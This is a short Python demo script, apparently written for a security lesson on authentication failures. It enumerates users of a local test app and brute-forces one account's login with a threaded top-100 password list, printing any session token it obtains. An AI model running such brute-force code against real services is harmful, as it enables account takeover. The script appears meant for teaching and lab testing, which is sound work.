# Author: Ritchie Yapp
# https://github.com/speckly

# A07 Detailed demo
# Modified 100 passwords file, replaced "abc123" with "123" for demo purposes

import requests
import os
import user_data
import concurrent.futures

ENDPOINT = "/user/login"
URL = f"http://localhost:8081{ENDPOINT}"

os.system('cls')
print("Script by @speckly\nkitten escalation\n")

user_data.get_users("http://localhost:8081/users")
print("Narrowed down which account to brute force. Username: user\nBut what is the password?")

def brute_force(password):
    password = password.strip()
    LOGIN_BODY = {
        "username": "user",
        "password": password
    }
    LOGIN_ENDPOINT = "http://localhost:8081/user/login"
    res = requests.post(LOGIN_ENDPOINT, json=LOGIN_BODY)
    if res.status_code != 200:
        msg = f"HTTP {res.status_code}: {res.text}"
    else:
        TOKEN = res.json()["token"]
        msg = f"Success, token is {TOKEN}"
    return password, msg
    
if __name__ == "__main__":
    with open("./exploit_demos/10-million-password-list-top-100.txt") as password_file:
        password_list = password_file.readlines()

    with concurrent.futures.ThreadPoolExecutor() as executor:
        futures = [executor.submit(brute_force, password) for password in password_list]

        for future in concurrent.futures.as_completed(futures):
            password, msg = future.result()
            print(f"{password}: {msg}")